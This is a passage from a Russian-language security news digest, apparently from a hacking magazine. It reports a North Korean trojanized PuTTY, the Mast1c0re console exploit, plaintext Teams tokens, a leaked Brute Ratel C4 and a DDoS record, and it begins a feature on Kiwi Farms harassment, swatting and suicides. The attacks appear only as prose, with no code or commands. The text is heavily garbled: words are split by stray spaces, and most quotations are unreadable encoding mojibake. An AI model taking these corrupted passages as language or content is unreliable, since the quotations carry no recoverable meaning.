   зар платы в офисах Google в Калифор нии, Вашингто не и Нью-Йор ке. Зар платы приведе ны
   за год.

   Инженер-иссле дователь: от 154 000 до 196 000 дол ларов

   Инженер-прог раммист: от 122 000 до 280 000 дол ларов

   Инженер ПО: от 126 000 до 225 000 дол ларов

   UX-иссле дователь: от 137 000 до 180 785 дол ларов

   UX-дизайнер: от 162 000 до 202 000 дол ларов

   Сис темный инже нер: 106 000 до 266 000 дол ларов

   Спе циалист по облачным вычис лениям: от 78 000 до 78 520 дол ларов

   Data-инже нер: от 106 000 до 182 000 дол ларов

   Data-сайентист: от 103 000 до 269 000 дол ларов

   Про дакт-менед жер: от 151 000 до 244 000 дол ларов





 БЭКДОР В PUTTY
  Аналитики из ком пании Mandiant предупредили о появлении троянизирован ной
  версии  утилиты  PuTTY,  пред положитель но  созданной  северокорейскими
   хакерами из группы UNC4034 (она же Temp.Hermit или Labyrinth Chollima). Судя
  по всему, вредоносная версия PuTTY исполь зует ся, чтобы взламывать орга-
  низации, которые пред ставляют интерес для злоумыш ленников.
    Обычно такие атаки начинаются с того, что злоумыш ленники связываются
  со своими целями по элек трон ной почте и делают им заман чивое пред -
  ложение, якобы приг лашая их на работу в Amazon. Затем хакеры отправляют
  жертве   сообщение   в   WhatsApp,   в   котором   делят ся   файлом
   amazon_assessment.iso. В последнее время файлы ISO все чаще исполь зуют ся
  для заражения машин под управлением Windows, потому что двойной клик
  по ним по умолчанию приводит к их мон тированию.
     ISO включает в себя тек стовый файл (readme.txt), содержащий IP-адрес
  и учет ные дан ные для входа, а так же вредоносную версию PuTTY (PuTTY.exe).
  Интересно, что хакеры так же исполь зуют в своих атаках SSH-клиент KiTTY
  (форк PuTTY), в таких слу чаях имя файла будет Amazon-KiTTY.exe.
    Пока неясно, как имен но строится диалог между злоумыш ленниками и жер-
   твами, но, похоже, хакеры убеждали жертв открыть ISO-образ и исполь зовать
  пред ложен ный SSH-инстру мент и учет ные дан ные для под ключения к хосту,
   чтобы пройти некое тестирование.
     Хотя вредоносная версия PuTTY оснащалась вредоносной полезной наг -
   рузкой,  она была  полностью фун кциональ ной  (так  как  ском пилирована
  из легитим ной версии прог раммы). Но исследователи обращают внимание
  на то, что легитим ные версии PuTTY под писаны разработ чиком, а версии
   хакеров — нет.





  От чет Mandiant гласит, что хакеры модифицировали фун кцию connect_to_host()
  таким образом, чтобы при успешном SSH-под ключении с исполь зованием
  приложен ных   учет ных  дан ных  разверты вался  вредоносный  шелл-код
  DAVESHELL в формате библиотеки DLL (colorui.dll), упакован ной с Themida.
     Чтобы сделать запуск шелл-кода незамет ным, вредоносная PuTTY исполь -
   зует уязвимость в colorcpl.exe, а DAVESHELL действу ет как дроппер финаль -
  ного пейлоада — бэк дора AIRDRY.V2, который выполняет ся непосредствен но
   в памяти.
    По дан ным исследователей, по сравнению с предыду щей версией AIRDRY
  новый вариант под держивает мень ше команд, зато добавлены новые воз-
  можности: выполнение в памяти и обновление ключа AES для связи с управля-
  ющим сервером.


  ПИРАТСКИЙ КОНТЕНТ В РУНЕТЕ

   На фоне ухо да из Рос сии крупных кинос тудий и инос транных стриминговых сер висов в Рунете
   замет но вырос ло количес тво ссылок с пират ским контентом. Чаще все го пираты выкладывают
   гол ливуд ские премь еры, однако, по сло вам учас тников рынка, сложнее защищать становит ся
   и рос сийские сериалы, кино и шоу.

  В Яндексе сообщают, что летом заблокиро вали на 42% боль ше ссылок  ( 9,1 миллиона
   за июнь — август про тив 6,4 миллиона прошлым летом), а в «Газ пром-медиа» говорят о рос те
   бло киро вок на 25% (до 1,64 миллиона) во вто ром квар тале.





 ЭКСПЛОИТ ДЛЯ
 PLAYSTATION
  Хакер, известный под псевдонимом CTurt, давно специализиру ется на взломе
  игровых  кон солей.  Теперь  он продемонстрировал  свежий  PoC-эксплоит
   Mast1c0re, который называет «прак тически неустранимой» дырой в безопас-
   ности PS4 и PS5. Mast1c0re должен позволить устанавливать и запускать
  на кон солях Sony произволь ные приложения.
      CTurt рассказывает, что продемонстрировал Mast1c0re пред ставителям
  Sony еще год назад, через прог рамму bug bounty, но так и не дождался выхода
  публичного исправления.
    В своей работе Mast1c0re полагается на ошибки JIT-ком пиляции, которую
  исполь зует эму лятор, запускающий определен ные игры для PS2 на кон солях
  PS4 и PS5. Эта ком пиляция дает эму лятору специаль ные разрешения на неп-
  рерывную  запись  PS4-ready-кода  (на  основе  оригиналь ных  исходников
  для PS2) непосредствен но перед тем, как этот код будет выполнен на уровне
  приложений (application layer). Получив кон троль над обеими сторонами этого
  процесса, хакер может написать привилегирован ный код, который система
   в итоге сочтет легитим ным и безопасным.


        «Ïîñêîëüêó ìû èñïîëüçóåì ñèñòåìíûå âûçîâû JIT ïî ïðÿ ìîìó íàç-
         íà÷åíèþ, íà ñàìîì äåëå ýòî äàæå íå ýêñïëîèò, à ïðîñòî õèòðûé «
         òðþê», — êîììåíòèðóåò CTurt.                 »
  Исследователь пишет, что получить кон троль над эму лятором теоретически
  позволяют любые известные эксплоиты, которые давным-давно существу ют
  для PS2-игр. Хотя некоторые из них можно активировать бук валь но одним
  нажатием кнопки, для боль шинства пот ребу ется исполь зовать некую извес-
  тную игру и доступ к специаль но отформатирован ному файлу сохранения
  на карте памяти, что приведет к переполнению буфера и откроет доступ
   к защищен ной памяти. Нужно отметить, что похожие эксплоиты исполь -
   зовались для взлома PSP и Nintendo 3DS на протяжении многих лет.
     К  сожалению,  этот  способ  нем ного  ограничен  из-за  того,  что
  PS4 и PS5 не могут распознать стан дартные диски для PS2. Это означает, что
  любая эксплу атируемая игра должна быть доступна в виде заг ружаемой через
  PSN игры PS2-на-PS4 либо это должна быть одна из тех нем ногих игр для PS2,
   что выходили на физических дисках, совместимых с PS4.
    Получить готовый для эксплу атации файл сохранения PS2 на PS4 тоже
  не так просто. CTurt рассказывает, что ему приш лось исполь зовать уже взло-
  ман ную PS4 для цифровой под писи модифицирован ного файла сохранения
  игры Okage Shadow King, чтобы тот работал с его PSN  ID. Затем CTurt
  с помощью системной фун кции импорта сохранений на USB заг рузил файл
   в целевую систему.
     Под готовив этот «фун дамент», CTurt наконец перешел к сложной серии
  переполнений буфера и стека, утечек памяти и эксплоитам для RAM, которые
  он исполь зовал для получения кон троля над эму лятором PS2. В итоге он сумел
   получить доступ к встроенным фун кциям заг рузчика для передачи ISO-файла
  PS2 по локаль ной сети, а затем дать эму лятору коман ду заг рузить эту игру
  через виртуаль ный диск.
    Од нако заг рузка дру гих игр для PS2 в эму лятор — это хорошо, но нас-
  тоящей целью CTurt было восполь зовать ся этой точкой входа, чтобы запускать
  произволь ный код в системе. Этот процесс хакер обещает деталь но описать
   в следующей статье, как и повышение привилегий, которое необходимо
  для запуска любого кода «в кон тек сте игр для PS4».
    По сути, хакерам по-прежнему придет ся исполь зовать отдель ный (и потен -
  циаль но под дающийся исправлению) эксплоит ядра, чтобы получить «полный
  кон троль» над PS4, объясняет CTurt. Но Mast1c0re уже должно быть достаточ-
  но для запуска сложных прог рамм, «включая JIT-оптимизирован ные эму ляторы
   и, вероятно, даже некоторые пират ские ком мерческие игры для PS4».
     Так же, по словам CTurt, Mast1c0re теоретически может послужить точкой
   входа для ком прометации гипервизора PS5, который управляет низкоуров-
  невой системной безопасностью на этой кон соли.
      CTurt под черкивает, что зак рыть дыру, которую исполь зует Mast1c0re, прак -
   тически невозможно. Дело в том, что эксплу атируемый эму лятор PS2 упакован
  с каждой доступной игрой PS2-на-PS4, а не хранит ся отдель но, как часть опе-
  рационной системы кон соли.
     То есть для физических дисков PS2-на-PS4 эксплоит будет работать, пока
  поль зователь отказывается от онлайн-обновлений перед игрой. А для циф-
  ровых релизов это означает, что, даже если эксплоит исправлен, существу ют
  методы перейти на  сохранен ную версию, пригод ную для  эксплу атации,
  с исполь зованием прок сирован ного HTTP-трафика с локаль ного сервера.

        «Ïðîáëåìà íåèñïðàâèìà íå ñ òåõ íè÷åñêîé òî÷êè çðå íèÿ, íî â òîì ñìûñ-
          ëå, ÷òî òàê óñòðîåíà êîíñîëü è îíè íå áóäóò åå ìåíÿòü. Åñëè ó âàñ åñòü «
         ýêñïëóàòèðóåìàÿ èãðà (öèôðîâàÿ èëè ôèçè÷åñêàÿ), Sony áóäåò ñëîæíî
         óäàëèòü èëè èñïðàâèòü åå íà âàøåé êîíñîëè», — îáúÿñíÿ åò CTurt.                 »
  В похожей ситу ации ком пания Nintendo приняла решение удалить эксплу ати-
  руемые 3DS-игры из Nintendo eShop, пытаясь ограничить возможный ущерб.
  Пока Sony не поступила так же с эксплу атируемы ми играми для PS2 в PSN.


 БЛОКИРОВЩИКИ БУДУТ БЛОКИРОВАТЬ





   Раз работ чики браузе ра Vivaldi, который пос тавля ется со встро енным бло киров щиком рекламы
   и тре керов, заверили, что их бло киров щик рекламы про дол жит работать даже пос ле вступ-
   ления в силу Google Manifest V3, который опре деля ет воз можнос ти и ограниче ния для рас -
   ширений.
     Де ло в том, что уже в 2023 году дол жна зарабо тать третья вер сия манифес та, а он все
   еще весь ма далек от иде ала и силь но ограничивает воз можнос ти бло киров щиков рекламы,
   антивирусов, решений для родитель ско го контро ля и раз личных про дуктов, повышающих кон-
   фиденциаль ность.
      Ко манда Vivaldi уве ряет, что ее бло киров щик будет работать как нужно, ведь исходно он
   был соз дан именно как ответ гря дуще му Manifest V3. Что касается сто ронних бло киров щиков,
   точного отве та у команды Vivaldi нет, но раз работ чики наде ются на лучшее и обе щают дать
   поль зовате лям выбор.

            «Важно отме тить, что рас ширения-бло киров щики час то зависят от других →          API-интерфейсов, которые удалены в Manifest V3 (и, веро ятно, их будет куда
         сложнее вер нуть обратно). Поэто му нет гарантий, что прос того сох ранения
         бло кирующей функции webRequest будет дос таточно и не понадо бит ся допол -
          нитель ная работа со сто роны мейнтейнеров этих рас ширений.
           Пос коль ку Vivaldi пос тро ен на базе Chromium, то, как мы справимся с изме -
          нениями в API, зависит от того, как Google реализует свои ограниче ния. Можем
          заверить, что, какие бы ограниче ния ни добав ляли в Google, в ито ге мы пос -
          тараемся их снять. Наша мис сия всег да будет заключать ся в том, что бы у вас
         был выбор»,


  — пишет в бло ге компании раз работ чик Vivaldi Жуль ен Пикалауса (Julien Picalausa).





                                          Продолжение статьи →
← Начало статьи
 ПРОБКА ИЗ-ЗА АТАКИ
  В начале сен тября в Москве прак тически воплотился в жизнь сюжет из игры
  Watch  Dogs: на  Кутузовском  проспекте образовалась огромная пробка,
   в которой стояло подозритель но много автомобилей так си. Как оказалось,
  неизвестные попытались нарушить работу «Яндекс Так си» и создали множес-
   тво фейковых заказов в районе Фили на западе города.
     Пробка начала скапливать ся примерно в 11:00 утра по московскому вре-
  мени и прак тически полностью состояла из десят ков машин так си. Сами
  водители жаловались в социаль ных сетях на ложные заказы и на то, что «всех
  отправили в один район».
     Как вскоре сообщили в пресс-службе Яндекса, затор действитель но обра-
   зовался не просто так: неизвестные попытались провести атаку на сервис,
  но служба безопасности оперативно остановила попыт ки искусствен ного скоп-
  ления автомобилей.

         «Óòðîì 1 ñåíòÿáðÿ „ßíäåêñ Òàê ñè“ ñòîëêíóëñÿ ñ ïîïûòêîé çëîóìûø-
         ëåííèêîâ íàðóøèòü ðàáîòó ñåðâèñà — íåñêîëüêèì äåñÿòêàì âîäèòå ëÿì «
        ïîñòóïèëè ìàññîâûå çàêàçû â ðàéîí Ôèëè. Âîäèòå ëè ïðîâåëè â ïðîáêå
          èç‑çà ôåéêîâûõ çàêàçîâ îêîëî 40 ìèíóò. Âîï ðîñ êîìïåíñàöèé áóäåò
        ðåøåí â ñàìîå áëèæàéøåå âðå ìÿ. Ñåé÷àñ àâòîìîáèëè òàê ñè óæå ðàçú-
         åõàëèñü  èç  ðàéîíà  ñêîï ëåíèÿ  è  âûïîëíÿþò  çàêàçû  â  îáû÷íîì
         ðåæèìå», — ñîîáùèëè â ßíäåêñå.                 »
   Так же пред ставители ком пании под черкну ли, что алгоритм обнаружения и пре-
  дот вращения подобных атак был усовершенствован, чтобы исключить такие
  инциден ты в будущем.


 БОЛЬШЕ YOUTUBE И TELEGRAM

   Аналитики Mediascope изучили, как изме нилось медиапот ребле ние рос сийских поль зовате лей
   в 2022 году. По их данным, в сред нем каждый рос сиянин про водит в сети 3 ч 41 мин в день
   и боль шая часть это го вре мени про ходит в социаль ных сетях и за прос мотром видео.





  Лидерс тво сре ди социаль ных сетей дер жат «Вконтакте» и Telegram, который также попадает
   в эту катего рию и демонс трирует значитель ный прирост аудитории с фев раля 2022 года.





   Зато про дол жает ся замет ное сокращение аудитории в запрещенных и заблокиро ванных
   Facebook* и Instagram*, которыми теперь ежед невно поль зуют ся толь ко 0,2% и 8% населе ния
   соот ветс твенно.





   Также отме чает ся, что в июле и августе рос сияне стали про водить боль ше вре мени
   на YouTube. С начала года показатель оставал ся стабиль ным и сос тавлял 84 мин . В июле же
   сред нее вре мя прос мотра видео на YouTube вырос ло до 87 мин , а в августе — до 88 мин .

   На YouTube каждый день заходят пример но 39% рос сийских поль зовате лей. Охват также уве -
   личил ся год к году: в августе 2022 года он сос тавил 48 миллионов человек про тив 41,3 мил-
  лиона человек в августе 2021 года.

  В целом сре ди интернет-ресур сов по охвату лидируют WhatsApp, Яндекс, Google, «Вконтакте»
   и YouTube.





   * Принад лежат компании Meta, деятель ность которой приз нана экс тре мист ской, организация
   запрещена в Рос сии.





 ТОКЕНЫ ОТКРЫТЫМ
 ТЕКСТОМ
  Специалисты обнаружили серь езную уязвимость в десктопном приложении
   Microsoft Teams. Баг позволяет получить доступ к токенам аутен тификации,
   которые, как оказалось, хранят ся в формате простого тек ста, без какой-либо
  защиты.
   О проблеме рассказывают исследователи из ИБ-ком пании Vectra. По их
  словам, уязвимость зат рагивает десктопные версии приложения для Windows,
   Linux и macOS. Фак тически злоумыш ленник с локаль ным доступом в системе,
  где установлено приложение Microsoft Teams, может похитить незащищен ные
   токены, а затем исполь зовать их для входа в чужую учет ную запись.

         «Ýòà àòàêà íå òðå áóåò ñïå öèàëüíûõ ðàçðåøåíèé èëè ñëîæíîé ìàëâàðè,
         íî ìîæåò íàíåñòè ñîê ðóøèòåëüíûé óðîí», — îáúÿñíÿ åò ýêñïåðò Vectra «
        Êîííîð Ïèïëñ (Connor Peoples).                 »
  Специалисты Vectra обнаружили эту проблему в августе 2022 года и немед -
  ленно сообщили о ней в Microsoft, однако разработ чики ком пании не сог -
   ласились с тем, что это серь езная проблема, заявив, что исправлению она
  не под лежит. Все дело в том, что для реализации атаки хакеру сначала нужно
   получить доступ к сети жертвы.
     Корень ошибки уходит к тому фак ту, что Microsoft Teams — это Electron-при-
  ложение. То есть оно запускает ся в окне браузера со всеми элемен тами,
  необходимы ми для обычной веб-страницы (файлы cookie, строки сеан са, жур-
  налы и так далее). По умолчанию Electron не под держивает шифрование
  или защищен ные расположения файлов, поэтому, хотя такая прог рам мная сре-
  да универсаль на и проста в исполь зовании, она не считает ся безопасной
  для разработ ки критически важных продук тов.
     Аналитики Vectra исследовали Microsoft Teams в поисках способа удаления
  деак тивирован ных учет ных записей из клиент ских приложений, но вместо этого
  наш ли файл ldb с токенами доступа в откры том виде. Кроме того, они обна-
  ружили, что папка Cookies содержит действитель ные токены аутен тификации,
  а так же информацию об учет ной записи, дан ные сеан са и маркетин говые теги.





        «Â õîäå ïðîâåðêè áûëî óñòàíîâëåíî, ÷òî ýòè òîêåíû àêòèâíû è íå ÿâëÿ -
         þòñÿ ñëó÷àéíûì äàìïîì êàêîé‑òî ïðå äûäóùåé îøèáêè. Ýòè òîêåíû «
        ïðå äîñòàâèëè íàì äîñòóï ê API Outlook è Skype», — ðàññêàçûâàþò
         èññëå äîâàòåëè.                 »
  После этого откры тия в ком пании создали простой эксплоит, злоупот ребля-
  ющий вызовом  API,  что позволяет отправлять сообщения самому  себе.
  Исполь зуя SQLite для чтения БД Cookies, исследователи добились получения
   токенов аутен тификации через сообщения чата.
    По сути, этот метод могут взять на воору жение операторы инфостилеров:
  токены аутен тификации Microsoft Teams позволят обойти многофак торную
   аутен тификацию и получить полный доступ к учет ным записям жертв.
     Так как пат ча, скорее всего, не будет, специалисты Vectra рекомен дуют
  поль зователям перек лючить ся на браузерную версию Microsoft Teams. Так же
  они совету ют поль зователям Linux перейти на дру гой продукт для совместной
   работы, тем более что недавно Microsoft сообщила, что планиру ет прек ратить
  под держку этой плат формы к декабрю.


  704,8 ÌÈËËÈÎÍÀ ПАКЕТОВ В СЕКУНДУ

  В середине сентября компания Akamai зафиксировала мощную DDoS-атаку на одно го из ее
   евро пейских клиентов. «Мусор ный» трафик дос тиг мощности 704,8 миллиона пакетов
   в секун ду, что пример но на 7% выше пре дыдущего рекора.

  Прошлый рекорд был установ лен в июле во вре мя атак на неназ ванно го клиента Akamai из Вос -
   точной Евро пы. Жер тва под вер глась целой череде  DDoS-атак, которые были раз биты
   на десят ки «волн», а общее количес тво инцидентов пре высило 75. Атака длилась око ло 14 ч
   и на пиках дос тигала мощности в 853,7 Гбит/с и 659,6 миллиона пакетов в секун ду.

   Те перь же Akamai обнаружила и заблокиро вала 201 атаку (про тив лет них 75), исхо див шую
   с 1813 IP-адре сов (про тив 512 ранее).





 BRUTE RATEL
 ВЗЛОМАЛИ
  На русскоязычных и англоязычных хакерских форумах распространяет ся взло-
  ман ная версия red team инстру мен та Brute Ratel Command and Control Center
   (Brute Ratel C4 или BRc4). Если рань ше создатель инстру мен тария Читан Наяк
   (Chetan Nayak) уверял, что при обнаружении злоупот реблений он может иден -
  тифицировать нарушителя и отозвать лицен зию, теперь это уже не получит ся.
    В  2020  году  Читан  Наяк,  бывший  участник  red  team  в  Mandiant
  и CrowdStrike, создал BRc4 в качестве аль тернативы Cobalt Strike. Инстру мен -
  ты получились одновремен но похожими и непохожими друг на дру га. К при-
   меру, Cobalt Strike позволяет разверты вать «маяки» на ском прометирован ных
   устройствах для удален ного наблюдения за сетью или выполнения команд.
  В свою очередь, Brute Ratel позволяет разверты вать на удален ных хостах«бар-
   суков» (badgers), которые очень похожи на маяки в Cobalt Strike. Такие «бар-
   суки»  под ключают ся  к  управляющему  серверу  злоумыш ленника,  чтобы
   получать коман ды или передавать операторам резуль таты уже запущен ных
  команд.
     Первые злоупот ребления Brute Ratel были обнаружены летом 2022 года.
   Так как BRc4 во многом ориентирован на уклонение от обнаружения EDR
  и антивирусными решениями, почти все защит ные продук ты не определяют
   в нем вредоносное ПО. Из-за этой особен ности исследователи называли Brute
   Ratel «уникаль но опасным».
    В настоящее время годовая лицен зия на Brute Ratel стоит 2500 долларов
  США на одного поль зователя, а клиенты обязаны предоставить рабочий адрес
   элек трон ной почты и пройти проверку перед получением лицен зии. Посколь ку
  проверка   выполняет ся   вручную   (хотя   неизвестно,   как   имен но),
  летом 2022 года перед экспертами встал вопрос: как злоумыш ленники вооб-
  ще получили лицен зию?
     Тог да Читан Наяк объяснял, что лицен зию слил на сторону недоволь ный
   сот рудник одного из его клиентов. Разработ чик заверил, что пейлоады поз-
  воляют ему видеть, кому они принад лежат, поэтому он сумел иден тифици-
   ровать и оперативно отозвать лицен зию.
     Впрочем, уже тог да сообщалось, что злоупот ребления Brute  Ratel —
  не единичный слу чай. К примеру, по информации ИБ-специалистов, операто-
  ры вымогателя Conti вообще приобретали лицен зии Brute Ratel, создавая
  для этих целей специаль ные под ставные американ ские ком пании.
     Су дя по всему, теперь хакерам боль ше не придет ся прибегать к подобным
  ухищрениям. ИБ-эксперт Уилл Томас  (Will Thomas), известный под ником
   BushidoToken, обнаружил, что взломан ная копия Brute Ratel (версии 1.2.2) цир-
   кулиру ет среди злоумыш ленников на хакерских форумах с середины сен тября.

         «Òåïåðü íà ïîïóëÿðíûõ õàê‑ôîðóìàõ, ãäå òóñóþòñÿ áðîêåðû äàííûõ,
         ðàçðàáîò÷èêè âðå äîíîñíûõ ïðîã ðàìì, áðîêåðû ïåðâîíà÷àëüíûõ äîñ- «
         òóïîâ è ïàðòíå ðû âûìîãàòåëåé, åñòü íåñêîëüêî òåì [ïîñâÿùåííûõ Brute
           Ratel], — ïðå äóï ðåæäàåò Òîìàñ. — Ñþäà âõîäÿò BreachForums, CryptBB,
        RAMP,  Exploit[.]in è  Xss[.]is, à òàê æå ðàçëè÷íûå ãðóï ïû â Telegram
        è Discord».                 »





  Томас пишет, что в этой версии Brute Ratel вообще не нужно вводить лицен -
  зион ный ключ и она не выг лядит под дель ной ни по его мнению, ни по мнению
   его коллег из ком пании Curated Intel. По словам эксперта, злоумыш ленники
  уже активно делят ся друг с дру гом скрин шотами, на которых вид но, как они
   тестиру ют инстру мен тарий.





  Читан Наяк уже под твердил, что ранее на VirusTotal была заг ружена невзломан -
  ная версия инстру мен тария, которая затем была взломана русскоязычной
   хакерской группировкой Molecules для удаления проверки лицен зии.
     Увы, это означает, что в скором будущем боль ше злоумыш ленников начнут
  исполь зовать Brute Ratel вместо Cobalt Strike или вместе с ним. При этом Уилл
  Томас под черкивает, что инстру мен тарий способен генерировать шелл-код,
  который  в  настоящее  время  крайне  плохо обнаруживает ся  защит ными
  решениями.


  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА

   Японское правитель ство борет ся с исполь зованием дис кет


   Chrome поз воля ет сайтам взаимо действо вать с буфером обме на без раз решения


   Инди-раз работ чик вынудил Valve заблокиро вать курато ров-мошенников в Steam


   Влас ти закрыли мар кет плейс WT1SHOP, про давав ший банков ские кар ты, учет ные данные
   и документы


   Пат чи для проблемы Retbleed замед ляют вир туаль ные машины на Linux на 70%


   Coinbase под держала иск про тив Минфина США, оспаривающий санкции про тив Tornado Cash


   Ис сле дователи соз дали устройство TickTock, спо собное обнаруживать прос лушку


   Экс-глава безопас ности Twitter заявил, что в компании работают шпионы из Китая и Индии


   Кар деры исполь зуют фейковые сайты знакомств и под дер жки клиентов, что бы воровать день ги


   Рос сийским поль зовате лям заблокиро вали обновле ние до Windows 11 22H2
HEADER





      ПОЧЕМУ CLOUDFLARE ОТКАЗАЛАСЬ
    ЗАЩИЩАТЬ САЙТ, ГДЕ СОБИРАЮТСЯ
                 ТРОЛЛИ И СТАЛКЕРЫ





В  начале  сен тября  одной  из  самых
обсужда емых   тем   в   англо языч ном
интернете   ста ло  решение  ком пании
Cloudare, которая под дав лени ем общес-
твен ности прек ратила защищать сайт Kiwi       Мария Нефёдова                                                                 Мария «Mifrill» Нефёдова
Farms. Этот ресурс дав но называ ют глав -          nefedova@glc.ru
ным местом сбо ра трол лей и стал керов,
а его сообщество обви няли в нескольких
слу чаях доведения до само убий ства, прес-
ледова нии бессчет ного числа жертв, сват -
тинге и трав ле, которая зачастую вып -
лески валась  далеко  за  пределы  сети.
Давай раз берем ся, почему Cloudare соч -
ла сайт опасным только сей час и что ее
к это му под тол кну ло.


×ÒÎ ÅÙÅ ÇÀ KIWI FARMS?

Как ни стран но, форумы Kiwi Farms работали не в даркнете и существу ют почти
десять лет — с 2013  года. Сайт основан несколь кими людь ми, среди
которых — бывший администратор имид жборда 8chan Джошуа Мун (Joshua
Moon), известный в сети под ником Null. Вскоре после запуска форумов браз-
ды правления ресурсом окон чатель но переш ли к нему, и в настоящее время
Kiwi Farms управляет имен но он.





           Сейчас Kiwi Farms доступен в основном через Tor

До 2014 года ресурс носил название CWCki Forums, так как исходно он пред -
назначался  для  травли  всего  одного  человека —  художницы,  автора
веб-комик сов, преследовать которую начали еще в 2007 году на 4chan.
В какой-то момент тролли создали о ней статью в Encyclopedia Dramatica,
но некоторые сочли, что материал недостаточно полный и точный. Так воз-
никла специаль ная вики под названием CWCki, которое составили из ини-
циалов жертвы. Позже кому-то показалось, что CWCki Forums созвучно с Kiwi
Farms, и сайт переименовали.
  Со временем ресурс, изначаль но посвящен ный преследованию лишь одно-
го человека, разросся до огромного сообщества, которое в СМИ не раз на-
зывали главным прибежищем троллей и сталкеров всех мастей. Сами поль -
зователи форумов описывали себя как «сообщество, посвящен ное обсужде-
нию эксцентричных людей, которые доброволь но выставляют себя дураками».
   Участники Kiwi Farms годами издевались над тысячами публичных и не
очень личностей и преследовали целые сообщества. Док синг, сват тинг (от
английского swatting, ког да, сообщая о ложных угрозах взры ва, захвате залож-
ников и подобном, добиваются того, чтобы к жертвам домой прислали отряд
спецназа или полиции), угрозы, преследование не толь ко в сети, но и в реаль -
ной жизни — все это обычные буд ни для участников Kiwi Farms. Наверное, дос-
таточно сказать, что доведение до самоубийства считает ся особен но выда-
ющим ся достижением на этом сайте.
  Чаще всего поль зователи Kiwi Farms травили участников ЛГБТ-сообщества
и нейроот личных людей (страдающих различны ми отклонениями). Но это
не значит, что все ограничивалось толь ко ими. Так же жертвами Kiwi Farms
регулярно становились журналисты, активисты, сетевые знаменитости, полити-
ческие  деятели  и  простые,  почти  слу чайные  люди,  каким-то образом
«перешед шие дорогу» участникам форума.
  До недавнего времени самыми известны ми жертвами Kiwi Farms считались
следующие люди (их смерти вызывали в сети и СМИ замет ный резонанс, одна-
ко до каких-то реаль ных действий против Kiwi Farms дело так и не дош ло).
   Разработ чик SNES-эму ляторов,  известный под ником  Near. Покон чил
с собой в 2021 году, сообщив перед смертью, что устал бороть ся с депресси-
ей, которую значитель но усу губила длитель ная травля, устроенная поль зовате-
лями Kiwi Farms.

      «Îò íàïàäîê íà ìåíÿ çà òî, ÷òî ÿ àóòèñò, âñå ïåðåðîñëî â ïðåñëåäîâà-
      íèå è äîê ñèíã ìîèõ äðóçåé, îäíîãî èç êîòîðûõ âûíóæäàëè ïîêîí÷èòü«
      ñ ñîáîé, ïðîñòî ÷òîáû äîáèòüñÿ îò ìåíÿ ðåàê öèè. Èç‑çà ýòîãî ÿ ïîòåðÿë
      îäíîãî èç ñâîèõ ëó÷øèõ äðóçåé è ÷óâñòâóþ ñåáÿ îòâåòñòâåííûì.
      Äëÿ ìåíÿ óæå ñëèøêîì ïîçäíî, íî ÿ ìîëþñü, ÷òîáû êòî‑íèáóäü êîã -
      äà‑íèáóäü ñäå ëàë ÷òî‑íèáóäü ñ ýòèì ñàéòîì. Ñëèøêîì ìíîãî ëþäåé
      ñòðàäàåò, íî, êàæåòñÿ, íèêîìó íåò äî ýòîãî äåëà, ïîòîìó ÷òî â ñåòè âñå
     ìû ïðàê òè÷åñêè íèê òî è îíè çíàþò îá ýòîì. Çëî ïîáåæäàåò, êîã äà
      õîðîøèå ëþäè áåçäåéñòâóþò», — ïèñàë Near ïåðåä ñìåðòüþ.                »
Тран сген дерная  разработ чица  игр  Хлоя  Сагал  (Chloe  Sagal),  которая
в 2018 году совершила акт самосожжения в Портлен де, штат Орегон (позже
скон чалась в боль нице от получен ных травм). Перед этим поль зователи Kiwi
Farms травили Сагал несколь ко лет, и, по словам дру зей, ее все чаще стали
посещать мысли о суициде.

      «Âñÿ êèé ðàç, êîã äà îíà ãîâîðèëà î ñàìîóáèéñòâå, ó÷àñòíèêè Kiwi Farms
      æàëîâàëèñü íà åå  ñòðàíèöó  â  Facebook&ast;   , è åå áëîêèðîâàëè.«
     Çà ìåñÿö äî åå ñìåðòè òàêîå ïðîèñõîäèëî íåñêîëüêî ðàç», — ðàññêà-
      çûâàëè ÑÌÈ äðóçüÿ Ñàãàë.                »
Так же поль зователи Kiwi Farms много лет присталь но следили за прог раммис-
том Терри Дэвисом (Terry Davis), небезызвестным создателем операционной
системы с религиозны ми мотивами TempleOS, которую Дэвис проектировал
для «общения с богом». В 2018 году его сбил поезд, и следствию так и не уда-
лось установить, было ли это самоубийство или несчастный слу чай.
  Дэвис был шизофреником, а с 1996 года у него наблюдались регулярные
маниакаль ные эпизоды, но в последние годы жизни он активно поль зовался
соцсетями, публиковал видеоблоги и стримил, чем и заин тересовал сообщес-
тво Kiwi Farms. Люди, знавшие Дэвиса, отмечали, что постоян ный троллинг
и провокации явно ухуд шали его состояние.
  Более того, поль зователями Kiwi Farms были даже известные массовые
убийцы. Например, Брен тон Харрисон Таррант, в 2019 году устроивший
стрель бу  в  мечетях  новозеланд ского  Крайстчерча  и  убивший  боль -
ше 50 человек.
   Тог да полиция направила администратору Kiwi Farms Джошуа Муну тре-
бование о сот рудничестве и запросила содействие в поиске поль зователей,
ответствен ных за распространение материалов Тарранта. Мун ответил на это
длин ной нецен зурной тирадой, суть которой сводилась к тому, что законы
Новой Зелан дии на него и сайт не распространяют ся.
   Нет, даже после этого Kiwi Farms не зак рыли. Просто запретили в Новой
Зелан дии.


ÊËÀÐÀ ÑÎÐÐÅÍÒÈ

К нынеш нему краху Kiwi Farms привела масштабная кам пания Drop Kiwi Farms,
которую запустила в сети еще одна жертва этих форумов — Клара Сорренти
(Clara Sorrenti), в онлайне известная как Keﬀals. Сорренти — тран сген дерная
активистка и Twitch-стример, то есть одна из самых лакомых для сообщества
Kiwi Farms целей.
  Все началось 5 августа, ког да в дом Сорренти в канад ском Лон доне вор-
валась полиция и ее саму в итоге арестовали. Дело в том, что накану не неиз-
вестные отправили членам город ского совета пись ма, в которых утверждалось,
буд то Сорренти владеет нелегаль ным огнестрель ным ору жием, уже убила
свою мать и теперь собирается пойти в город скую администрацию, чтобы
«расстрелять каждого цисгендера», которого встретит по пути.

      «Êîã äà ìåíÿ ðàçáóäèëè ïîëèöåéñêèå è ÿ óâèäåëà íàï ðàâëåííûé ìíå
      â ëèöî àâòîìàò, ÿ ïîäóìàëà, ÷òî ñåé÷àñ óìðó», — ïîçæå ðàññêàçàëà«
     Ñîððåíòè íà YouTube .                »





             Сорренти рассказывает о сват тинге и аресте

При этом сват тинг был уже не первым выпадом в адрес Сорренти. По ее сло-
вам, первое, что сделали участники форумов, ког да завели тред с ее именем
на Kiwi Farms, — это отыскали в сети нек ролог ее покойного отца и исполь -
зовали, чтобы найти посвящен ную ему страницу в Facebook&ast; . Там обна-
